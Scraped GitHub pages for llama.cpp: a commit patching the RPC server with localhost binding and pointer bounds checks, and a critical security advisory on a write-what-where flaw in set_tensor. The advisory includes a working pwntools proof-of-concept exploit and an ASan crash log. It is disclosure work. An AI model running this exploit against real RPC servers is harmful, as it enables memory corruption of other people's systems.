=== Content from github.com_ec3ea2e3_20250110_185933.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp%2Fcommit%2Fb72942fac998672a79a1ae3c03b340f7e629980b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp%2Fcommit%2Fb72942fac998672a79a1ae3c03b340f7e629980b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=ggerganov%2Fllama.cpp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ggerganov](/ggerganov)
/
**[llama.cpp](/ggerganov/llama.cpp)**
Public

* [Notifications](/login?return_to=%2Fggerganov%2Fllama.cpp) You must be signed in to change notification settings
* [Fork
  10.2k](/login?return_to=%2Fggerganov%2Fllama.cpp)
* [Star
   70.5k](/login?return_to=%2Fggerganov%2Fllama.cpp)

* [Code](/ggerganov/llama.cpp)
* [Issues
  268](/ggerganov/llama.cpp/issues)
* [Pull requests
  333](/ggerganov/llama.cpp/pulls)
* [Discussions](/ggerganov/llama.cpp/discussions)
* [Actions](/ggerganov/llama.cpp/actions)
* [Projects
  9](/ggerganov/llama.cpp/projects)
* [Wiki](/ggerganov/llama.cpp/wiki)
* [Security](/ggerganov/llama.cpp/security)
* [Insights](/ggerganov/llama.cpp/pulse)

Additional navigation options

* [Code](/ggerganov/llama.cpp)
* [Issues](/ggerganov/llama.cpp/issues)
* [Pull requests](/ggerganov/llama.cpp/pulls)
* [Discussions](/ggerganov/llama.cpp/discussions)
* [Actions](/ggerganov/llama.cpp/actions)
* [Projects](/ggerganov/llama.cpp/projects)
* [Wiki](/ggerganov/llama.cpp/wiki)
* [Security](/ggerganov/llama.cpp/security)
* [Insights](/ggerganov/llama.cpp/pulse)

## Commit

[Permalink](/ggerganov/llama.cpp/commit/b72942fac998672a79a1ae3c03b340f7e629980b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge commit from fork

[Browse files](/ggerganov/llama.cpp/tree/b72942fac998672a79a1ae3c03b340f7e629980b)
Browse the repository at this point in the history

* Loading branch information

[![@ggerganov](https://avatars.githubusercontent.com/u/1991296?s=40&v=4)](/ggerganov)

[ggerganov](/ggerganov/llama.cpp/commits?author=ggerganov "View all commits by ggerganov")
authored
Aug 9, 2024

1 parent
[6afd1a9](/ggerganov/llama.cpp/commit/6afd1a99dc9792096d4567ab9fa1ad530c81c6cd)

commit b72942f

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**53 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* examples/rpc

  + examples/rpc/README.md
    [README.md](#diff-46a7790ca3a9ea56ad20cb6035d93aa64a2cda39f1957b9a7d1621be1169bdd7)
  + examples/rpc/rpc-server.cpp
    [rpc-server.cpp](#diff-2acddc36e8e023a85caf88a8373fbc597710cfc596f5b3cebfc38540b986f380)
* ggml/src

  + ggml/src/ggml-rpc.cpp
    [ggml-rpc.cpp](#diff-7c08b9677b00130d85388646c2ed975c2f8b8320845c226b2c24c235f1d19928)
  + ggml/src/ggml.c
    [ggml.c](#diff-f028a352a33ee20b42faca7dcc389e8f0f9c9a55e016cccffed45fe90bcc13f8)

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[examples/rpc/README.md](#diff-46a7790ca3a9ea56ad20cb6035d93aa64a2cda39f1957b9a7d1621be1169bdd7 "examples/rpc/README.md")

Show comments

[View file](/ggerganov/llama.cpp/blob/b72942fac998672a79a1ae3c03b340f7e629980b/examples/rpc/README.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,5 +1,9 @@ |
|  |  | ## Overview |
|  |  |  |
|  |  | > [!IMPORTANT] |
|  |  | > This example and the RPC backend are currently in a proof-of-concept development stage. As such, the functionality is fragile and |
|  |  | > insecure. \*\*Never run the RPC server on an open network or in a sensitive environment!\*\* |
|  |  |  |
|  |  | The `rpc-server` allows running `ggml` backend on a remote host. |
|  |  | The RPC backend communicates with one or several instances of `rpc-server` and offloads computations to them. |
|  |  | This can be used for distributed LLM inference with `llama.cpp` in the following way: |
| Expand Down | |  |

13 changes: 12 additions & 1 deletion

13
[examples/rpc/rpc-server.cpp](#diff-2acddc36e8e023a85caf88a8373fbc597710cfc596f5b3cebfc38540b986f380 "examples/rpc/rpc-server.cpp")

Show comments

[View file](/ggerganov/llama.cpp/blob/b72942fac998672a79a1ae3c03b340f7e629980b/examples/rpc/rpc-server.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,7 +16,7 @@ |
|  |  | #include <stdio.h> |
|  |  |  |
|  |  | struct rpc\_server\_params { |
|  |  | std::string host = "0.0.0.0"; |
|  |  | std::string host = "127.0.0.1"; |
|  |  | int port = 50052; |
|  |  | size\_t backend\_mem = 0; |
|  |  | }; |
| Expand Down  Expand Up | | @@ -114,6 +114,17 @@ int main(int argc, char \* argv[]) { |
|  |  | fprintf(stderr, "Invalid parameters\n"); |
|  |  | return 1; |
|  |  | } |
|  |  |  |
|  |  | if (params.host != "127.0.0.1") { |
|  |  | fprintf(stderr, "\n"); |
|  |  | fprintf(stderr, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"); |
|  |  | fprintf(stderr, "WARNING: Host ('%s') is != '127.0.0.1'\n", params.host.c\_str()); |
|  |  | fprintf(stderr, " Never expose the RPC server to an open network!\n"); |
|  |  | fprintf(stderr, " This is an experimental feature and is not secure!\n"); |
|  |  | fprintf(stderr, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"); |
|  |  | fprintf(stderr, "\n"); |
|  |  | } |
|  |  |  |
|  |  | ggml\_backend\_t backend = create\_backend(); |
|  |  | if (!backend) { |
|  |  | fprintf(stderr, "Failed to create backend\n"); |
| Expand Down | |  |

36 changes: 35 additions & 1 deletion

36
[ggml/src/ggml-rpc.cpp](#diff-7c08b9677b00130d85388646c2ed975c2f8b8320845c226b2c24c235f1d19928 "ggml/src/ggml-rpc.cpp")

Show comments

[View file](/ggerganov/llama.cpp/blob/b72942fac998672a79a1ae3c03b340f7e629980b/ggml/src/ggml-rpc.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -197,6 +197,10 @@ static std::shared\_ptr<socket\_t> create\_server\_socket(const char \* host, int por |
|  |  | fprintf(stderr, "Failed to set SO\_REUSEADDR\n"); |
|  |  | return nullptr; |
|  |  | } |
|  |  | if (inet\_addr(host) == INADDR\_NONE) { |
|  |  | fprintf(stderr, "Invalid host address: %s\n", host); |
|  |  | return nullptr; |
|  |  | } |
|  |  | struct sockaddr\_in serv\_addr; |
|  |  | serv\_addr.sin\_family = AF\_INET; |
|  |  | serv\_addr.sin\_addr.s\_addr = inet\_addr(host); |
| Expand Down  Expand Up | | @@ -879,6 +883,14 @@ ggml\_tensor \* rpc\_server::deserialize\_tensor(struct ggml\_context \* ctx, const rp |
|  |  | if (result->buffer && buffers.find(result->buffer) == buffers.end()) { |
|  |  | return nullptr; |
|  |  | } |
|  |  |  |
|  |  | // require that the tensor data does not go beyond the buffer end |
|  |  | uint64\_t tensor\_size = (uint64\_t) ggml\_nbytes(result); |
|  |  | uint64\_t buffer\_start = (uint64\_t) ggml\_backend\_buffer\_get\_base(result->buffer); |
|  |  | uint64\_t buffer\_size = (uint64\_t) ggml\_backend\_buffer\_get\_size(result->buffer); |
|  |  | GGML\_ASSERT(tensor->data + tensor\_size >= tensor->data); // check for overflow |
|  |  | GGML\_ASSERT(tensor->data >= buffer\_start && tensor->data + tensor\_size <= buffer\_start + buffer\_size); |
|  |  |  |
|  |  | result->op = (ggml\_op) tensor->op; |
|  |  | for (uint32\_t i = 0; i < GGML\_MAX\_OP\_PARAMS / sizeof(int32\_t); i++) { |
|  |  | result->op\_params[i] = tensor->op\_params[i]; |
| Expand All | | @@ -898,7 +910,7 @@ bool rpc\_server::set\_tensor(const std::vector<uint8\_t> & input) { |
|  |  | const rpc\_tensor \* in\_tensor = (const rpc\_tensor \*)input.data(); |
|  |  | uint64\_t offset; |
|  |  | memcpy(&offset, input.data() + sizeof(rpc\_tensor), sizeof(offset)); |
|  |  | size\_t size = input.size() - sizeof(rpc\_tensor) - sizeof(offset); |
|  |  | const size\_t size = input.size() - sizeof(rpc\_tensor) - sizeof(offset); |
|  |  |  |
|  |  | struct ggml\_init\_params params { |
|  |  | /\*.mem\_size =\*/ ggml\_tensor\_overhead(), |
| Expand All | | @@ -913,6 +925,17 @@ bool rpc\_server::set\_tensor(const std::vector<uint8\_t> & input) { |
|  |  | return false; |
|  |  | } |
|  |  | GGML\_PRINT\_DEBUG("[%s] buffer: %p, data: %p, offset: %" PRIu64 ", size: %zu\n", \_\_func\_\_, (void\*)tensor->buffer, tensor->data, offset, size); |
|  |  |  |
|  |  | // sanitize tensor->data |
|  |  | { |
|  |  | const size\_t p0 = (size\_t) ggml\_backend\_buffer\_get\_base(tensor->buffer); |
|  |  | const size\_t p1 = p0 + ggml\_backend\_buffer\_get\_size(tensor->buffer); |
|  |  |  |
|  |  | if (in\_tensor->data + offset < p0 || in\_tensor->data + offset >= p1 || size > (p1 - in\_tensor->data - offset)) { |
|  |  | GGML\_ABORT("[%s] tensor->data out of bounds\n", \_\_func\_\_); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | const void \* data = input.data() + sizeof(rpc\_tensor) + sizeof(offset); |
|  |  | ggml\_backend\_tensor\_set(tensor, data, offset, size); |
|  |  | ggml\_free(ctx); |
| Expand Down  Expand Up | | @@ -943,6 +966,17 @@ bool rpc\_server::get\_tensor(const std::vector<uint8\_t> & input, std::vector<uint |
|  |  | return false; |
|  |  | } |
|  |  | GGML\_PRINT\_DEBUG("[%s] buffer: %p, data: %p, offset: %" PRIu64 ", size: %" PRIu64 "\n", \_\_func\_\_, (void\*)tensor->buffer, tensor->data, offset, size); |
|  |  |  |
|  |  | // sanitize tensor->data |
|  |  | { |
|  |  | const size\_t p0 = (size\_t) ggml\_backend\_buffer\_get\_base(tensor->buffer); |
|  |  | const size\_t p1 = p0 + ggml\_backend\_buffer\_get\_size(tensor->buffer); |
|  |  |  |
|  |  | if (in\_tensor->data + offset < p0 || in\_tensor->data + offset >= p1 || size > (p1 - in\_tensor->data - offset)) { |
|  |  | GGML\_ABORT("[%s] tensor->data out of bounds\n", \_\_func\_\_); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // output serialization format: | data (size bytes) | |
|  |  | output.resize(size, 0); |
|  |  | ggml\_backend\_tensor\_get(tensor, output.data(), offset, size); |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[ggml/src/ggml.c](#diff-f028a352a33ee20b42faca7dcc389e8f0f9c9a55e016cccffed45fe90bcc13f8 "ggml/src/ggml.c")

Show comments

[View file](/ggerganov/llama.cpp/blob/b72942fac998672a79a1ae3c03b340f7e629980b/ggml/src/ggml.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3724,7 +3724,8 @@ static struct ggml\_tensor \* ggml\_new\_tensor\_impl( |
|  |  | struct ggml\_tensor \* view\_src, |
|  |  | size\_t view\_offs) { |
|  |  |  |
|  |  | assert(n\_dims >= 1 && n\_dims <= GGML\_MAX\_DIMS); |
|  |  | GGML\_ASSERT(type >= 0 && type < GGML\_TYPE\_COUNT); |
|  |  | GGML\_ASSERT(n\_dims >= 1 && n\_dims <= GGML\_MAX\_DIMS); |
|  |  |  |
|  |  | // find the base tensor and absolute offset |
|  |  | if (view\_src != NULL && view\_src->view\_src != NULL) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b72942f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp%2Fcommit%2Fb72942fac998672a79a1ae3c03b340f7e629980b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_67be6358_20250110_185933.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp%2Fsecurity%2Fadvisories%2FGHSA-wcr5-566p-9cwj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp%2Fsecurity%2Fadvisories%2FGHSA-wcr5-566p-9cwj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=ggerganov%2Fllama.cpp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ggerganov](/ggerganov)
/
**[llama.cpp](/ggerganov/llama.cpp)**
Public

* [Notifications](/login?return_to=%2Fggerganov%2Fllama.cpp) You must be signed in to change notification settings
* [Fork
  10.2k](/login?return_to=%2Fggerganov%2Fllama.cpp)
* [Star
   70.5k](/login?return_to=%2Fggerganov%2Fllama.cpp)

* [Code](/ggerganov/llama.cpp)
* [Issues
  268](/ggerganov/llama.cpp/issues)
* [Pull requests
  333](/ggerganov/llama.cpp/pulls)
* [Discussions](/ggerganov/llama.cpp/discussions)
* [Actions](/ggerganov/llama.cpp/actions)
* [Projects
  9](/ggerganov/llama.cpp/projects)
* [Wiki](/ggerganov/llama.cpp/wiki)
* [Security](/ggerganov/llama.cpp/security)
* [Insights](/ggerganov/llama.cpp/pulse)

Additional navigation options

* [Code](/ggerganov/llama.cpp)
* [Issues](/ggerganov/llama.cpp/issues)
* [Pull requests](/ggerganov/llama.cpp/pulls)
* [Discussions](/ggerganov/llama.cpp/discussions)
* [Actions](/ggerganov/llama.cpp/actions)
* [Projects](/ggerganov/llama.cpp/projects)
* [Wiki](/ggerganov/llama.cpp/wiki)
* [Security](/ggerganov/llama.cpp/security)
* [Insights](/ggerganov/llama.cpp/pulse)

# Write-what-where in rpc\_server::set\_tensor

Critical

[ggerganov](/ggerganov)
published
GHSA-wcr5-566p-9cwj
Aug 12, 2024

## Package

No package listed

## Affected versions

< b3561

## Patched versions

>= b3561

## Description

# Write-what-where in ggml\_backend\_cpu\_buffer\_get\_tensor

## Summary

The unsafe `data` pointer member in the `rpc_tensor` structure can cause arbitrary address writing.

## Details

First, note that the `data` pointer membe in the `rpc_tensor` structure can be controlled by the user.

```
// ggml_tensor is serialized into rpc_tensor
#pragma pack(push, 1)
struct rpc_tensor {
    uint64_t id;
    uint32_t type;
    uint64_t buffer;
    uint32_t ne[GGML_MAX_DIMS];
    uint32_t nb[GGML_MAX_DIMS];
    uint32_t op;
    int32_t  op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];
    int32_t  flags;
    uint64_t src[GGML_MAX_SRC];
    uint64_t view_src;
    uint64_t view_offs;
    uint64_t data;
    char name[GGML_MAX_NAME];

    char padding[4];
};
#pragma pack(pop)
```

We can achieve arbitrary address writing during the following call by controlling the value of the `data` pointer.

The following is the function call chain that leads to arbitrary address writing:

* [[start\_rpc\_sercer](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)](

  [llama.cpp/ggml/src/ggml-rpc.cpp](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)

  Line 1144
  in
  [75af08c](/ggerganov/llama.cpp/commit/75af08c475e285888f66556d0f459c533b7deb95)

  |  | void start\_rpc\_server(ggml\_backend\_t backend, const char \* endpoint, size\_t free\_mem, size\_t total\_mem) { |
  | --- | --- |

  )
  + [[rpc\_serve\_client](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)](

    [llama.cpp/ggml/src/ggml-rpc.cpp](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)

    Line 1060
    in
    [75af08c](/ggerganov/llama.cpp/commit/75af08c475e285888f66556d0f459c533b7deb95)

    |  | static void rpc\_serve\_client(ggml\_backend\_t backend, sockfd\_t sockfd, size\_t free\_mem, size\_t total\_mem) { |
    | --- | --- |

    )
    - [[rpc\_server::set\_tensor](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L893)](

      [llama.cpp/ggml/src/ggml-rpc.cpp](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L893)

      Line 893
      in
      [e31a4f6](/ggerganov/llama.cpp/commit/e31a4f679779220312c165b0f5994c680a610e38)

      |  | bool rpc\_server::set\_tensor(const std::vector<uint8\_t> & input) { |
      | --- | --- |

      )
      * [[ggml\_backend\_tensor\_set](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L221)](

        [llama.cpp/ggml/src/ggml-backend.c](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L221)

        Line 221
        in
        [400ae6f](/ggerganov/llama.cpp/commit/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0)

        |  | GGML\_CALL void ggml\_backend\_tensor\_set(struct ggml\_tensor \* tensor, const void \* data, size\_t offset, size\_t size) { |
        | --- | --- |

        )
        + [[ggml\_backend\_cpu\_buffer\_set\_tensor](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L577)](

          [llama.cpp/ggml/src/ggml-backend.c](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L577)

          Line 577
          in
          [400ae6f](/ggerganov/llama.cpp/commit/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0)

          |  | GGML\_CALL static void ggml\_backend\_cpu\_buffer\_set\_tensor(ggml\_backend\_buffer\_t buffer, struct ggml\_tensor \* tensor, const void \* data, size\_t offset, size\_t size) { |
          | --- | --- |

          )
          ```
          GGML_CALL static void ggml_backend_cpu_buffer_set_tensor(ggml_backend_buffer_t buffer, struct ggml_tensor * tensor, const void * data, size_t offset, size_t size) {
              memcpy((char *)tensor->data + offset, data, size);	//Write-what-where In here!
              GGML_UNUSED(buffer);
          }
          ```

## PoC

### Build

```
git clone https://github.com/ggerganov/llama.cpp.git && cd llama.cpp && mkdir build-rpc && cmake .. -DGGML_RPC=ON && cmake --build . --config Release
pip install pwn
```
### Reproduce

In `llama/llama.cpp/build-rpc/bin`,Run this command:

```
./rpc-server -p 50052
```

Then run the following `Python script`:

```
from pwn import *

ALLOC_BUFFER = 0
GET_ALIGNMENT = 1
GET_MAX_SIZE = 2
BUFFER_GET_BASE = 3
FREE_BUFFER = 4
BUFFER_CLEAR = 5
SET_TENSOR = 6
GET_TENSOR = 7
COPY_TENSOR = 8
GRAPH_COMPUTE = 9
GET_DEVICE_MEMORY = 10

context(arch='amd64',log_level = 'debug')

p = remote("127.0.0.1",50052)
pd = b''
cmd = p8(GET_DEVICE_MEMORY)
content = b''
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
recv = p.recvall(timeout=1)
p.close()

p = remote("127.0.0.1",50052)

pd = b''
cmd = p8(GET_ALIGNMENT)
content = b''
input_size = p64(len(content))
pd+= cmd + input_size + content

cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
recv = p.recvall(timeout=1)
remote_ptr = u64(recv[0x18:0x20])
sz = u64(recv[0x20:0x28])
log.success(f"remote_ptr:{hex(remote_ptr)},size:{sz}")
p.recvall(timeout=1)
p.close()

'''
When the vulnerability cannot be triggered, you might want to adjust the next_ptr variable in the script to the buffer address returned by ALLOC_BUFFER.
'''
next_ptr = remote_ptr + 0x160
log.success(f'next_ptr:{hex(next_ptr)}')

p = remote("127.0.0.1",50052)
cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd = cmd + input_size + content
leak_address = remote_ptr + 0x90

#fake a rpc_tensor
rpc_tensor_pd = flat(
    {
        0: [
            0x1,  # id
            p32(2),  # type
            p64(next_ptr),  # buffer
            [  # ne
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
            ],
            [  # nb
                p32(1),
                p32(1),
                p32(1),
                p32(1),
            ],
            p32(0),  # op
            [p32(0)] * 16,  # op_params (corrected from 8 to 16)
            p32(0),  # flags
            [p64(0)] * 10,  # src
            p64(0),  # view_src
            p64(0),  # view_offs
            p64(0xdeadbeef),  # data
            'a' * 64,  # name
            'x' * 4  # padding
        ],
    }
)
cmd = p8(SET_TENSOR)
content = flat(
    {
        0: [rpc_tensor_pd + p64(0) + p64(0x100),
            b'a'*0x100]
    }
)
input_size = p64(len(content))
pd+= cmd + input_size + content

p.send(pd)
p.recv(0x18)
p.close()
```

It will be Write-what-where.

### Asan log

```
➜  bin git:(master) ✗ ./rpc-server -p 50052
create_backend: using CPU backend
Starting RPC server on 0.0.0.0:50052, backend memory: 7896 MB
Accepted client connection, free_mem=8280244224, total_mem=8280244224
Client connection closed
[~socket_t] closing socket 4
Accepted client connection, free_mem=8280244224, total_mem=8280244224
[get_alignment] alignment: 32
[alloc_buffer] size: 256 -> remote_ptr: 60b000000300, remote_size: 288
Client connection closed
[~socket_t] closing socket 4
Accepted client connection, free_mem=8280244224, total_mem=8280244224
[alloc_buffer] size: 256 -> remote_ptr: 60b000000460, remote_size: 288
[set_tensor] buffer: 0x60b000000460, data: 0xdeadbeef, offset: 0, size: 264
=================================================================
==12636==ERROR: AddressSanitizer: unknown-crash on address 0x0000deadbeef at pc 0x7f320e63a2c3 bp 0x7ffc8dcfc8d0 sp 0x7ffc8dcfc078
WRITE of size 264 at 0x0000deadbeef thread T0
    #0 0x7f320e63a2c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
